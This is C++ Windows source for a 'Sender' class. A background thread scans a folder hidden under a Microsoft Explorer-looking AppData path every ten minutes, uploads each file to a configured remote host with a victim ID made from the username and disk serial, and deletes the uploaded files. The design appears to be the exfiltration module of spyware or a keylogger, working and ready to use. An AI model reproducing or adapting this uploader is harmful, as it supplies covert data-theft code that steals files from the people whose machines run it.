#include "stdafx.h"
#include "Sender.h"

Sender::Sender()
{
}

Sender::~Sender()
{
}

struct FileCloser
{
	typedef HANDLE pointer;

	void operator()(HANDLE h)
	{
		if (h != INVALID_HANDLE_VALUE)
			CloseHandle(h);
	}
};

struct InetCloser
{
	typedef HINTERNET pointer;

	void operator()(HINTERNET h)
	{
		if (h != NULL)
			InternetCloseHandle(h);
	}
};

bool Sender::uploadFile(std::string filePath, std::string fileName, std::string computerId)
{
	std::string chContent = "------974767299852498929531610575\r\nContent-Disposition: form-data; name=\"file\"; filename=\"";
	chContent += fileName;
	chContent += "\"\r\nContent-Type: application/octet-stream\r\n\r\n";

	const char *szHeaders = "Content-Type: multipart/form-data; boundary=----974767299852498929531610575";
	const char *szContent = chContent.c_str();
	const char *szEndData = "\r\n------974767299852498929531610575--\r\n";

	std::unique_ptr<HANDLE, FileCloser> hIn(CreateFile((filePath + fileName).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL));
	if (hIn.get() == INVALID_HANDLE_VALUE)
		return false;

	DWORD dwFileSize = GetFileSize(hIn.get(), NULL);
	if (dwFileSize == INVALID_FILE_SIZE)
		return false;

	size_t sContentSize = strlen(szContent);
	size_t sEndDataSize = strlen(szEndData);

	std::vector<char> vBuffer(sContentSize + dwFileSize + sEndDataSize);
	char *szData = &vBuffer[0];

	memcpy(szData, szContent, sContentSize);
	szData += sContentSize;

	DWORD dw = 0, dwBytes;
	while (dw < dwFileSize)
	{
		if (!ReadFile(hIn.get(), szData, dwFileSize - dw, &dwBytes, NULL))
			return false;

		szData += dwBytes;
		dw += dwBytes;
	}

	hIn.reset();

	memcpy(szData, szEndData, sEndDataSize);

	std::unique_ptr<HINTERNET, InetCloser> io(InternetOpen(DEFAULT_USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0));
	if (io.get() == NULL)
		return false;

	std::unique_ptr<HINTERNET, InetCloser> ic(InternetConnect(io.get(), MY_HOST, MY_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0));
	if (ic.get() == NULL)
		return false;

	std::unique_ptr<HINTERNET, InetCloser> hreq(HttpOpenRequest(ic.get(), METHOD_POST, ("/" + computerId).c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0));
	if (hreq.get() == NULL)
		return false;

	if (!HttpSendRequest(hreq.get(), szHeaders, -1, &vBuffer[0], vBuffer.size()))
		return false;

	DWORD statusCode = 0;
	DWORD length = sizeof(DWORD);
	HttpQueryInfo(
		hreq.get(),
		HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
		&statusCode,
		&length,
		NULL
	);

	if (statusCode == 200)
		return true;
	else return false;
}

void Sender::startSending()
{
	HANDLE hFind;
	WIN32_FIND_DATA data;
	
	char userName[260];
	GetEnvironmentVariable("USERNAME", userName, 260);

	DWORD serialNumber = 0;
	GetVolumeInformationA("c:\\", NULL, 0, &serialNumber, NULL, NULL, NULL, 0);

	std::string filePath = "C:\\Users\\" + (std::string) userName + "\\AppData\\Local\\Microsoft\\Windows\\Explorer\\temp\\";
	std::string path = filePath + "*";
	std::string computerId = (std::string) userName + "_" + std::to_string(serialNumber);

	while (true)
	{
		Sleep(1000 * 60 * 10);

		hFind = FindFirstFile(path.c_str(), &data);

		do {
			if ((std::string)data.cFileName != "." && (std::string)data.cFileName != "..") {

				bool uploaded = uploadFile(filePath, (std::string) data.cFileName, computerId);

				if (uploaded)
					DeleteFile((filePath + (std::string) data.cFileName).c_str());
			}
				
		} while (FindNextFile(hFind, &data));
	}
}

DWORD WINAPI Sender::sendingThread(PVOID instance)
{
	((Sender*)instance)->startSending();
	return 0;
}

HANDLE Sender::startThread()
{
	return (HANDLE)CreateThread(0, 0, sendingThread, this, 0, 0);
}
